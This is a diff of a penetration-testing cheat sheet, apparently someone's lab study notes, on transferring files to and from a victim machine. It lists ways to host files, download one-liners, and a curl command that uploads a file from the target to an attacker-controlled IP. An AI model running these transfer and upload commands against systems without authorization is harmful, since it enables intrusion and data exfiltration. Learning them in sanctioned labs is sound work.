@@ -1,14 +1,15 @@
-## Links
+## File Transfer
+### Links
 
 - [Windows File Transfer](https://juggernaut-sec.com/windows-file-transfers-for-hackers/)
-- 
-## **Introduction**
+
+### **Introduction**
 
 When performing enumeration steps during a penetration test, there is often the need to transfer files to or from the victim machine, for example to run custom scripts or analyze files further in a controlled environment.
 
 There are different techniques and tools that can be used to transfer files and depending on the target operating system and installed software these may or may not work. The purpose of this cheat sheet is to provide an exhaustive resource for transferring files using command-line interfaces.
 
-## **Hosting Files**
+### **Hosting Files**
 
 Files can be hosted using methods such as web servers, FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:
 
@@ -31,7 +32,7 @@ Files can be hosted using methods such as web servers, FTP, SMB etc. The cheat s
 |“C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT|Microsoftg IIS Express|
 |base64 file;|Encoding the the file using base 64 and decoding it in the target machine|
 
-## **Downloading Files**
+### **Downloading Files**
 
 Files can be downloaded through the use of various tools such as wget/curl FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:
 
@@ -57,7 +58,7 @@ Files can be downloaded through the use of various tools such as wget/curl FTP, 
 |ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’|Ruby Open-URI library|
 |echo -n “base64-output” > file|Decoding the base64 output of the file|
 
-## Uploading file back to Kali
+### Uploading file back to Kali
 ```
 When using the python upload script:
 
@@ -76,7 +77,7 @@ OR
 curl -v -XPOST -F "file=@/home/anita/arat/test1;filename=test1" -F "path=/home/kali/Desktop/pen200/relia" http://192.168.45.219:9090/upload
 ```
 
-## SimpleHTTPServerWithUpload.py
+### SimpleHTTPServerWithUpload.py
 ```
 ***SimpleHTTPServerWithUpload.py
 
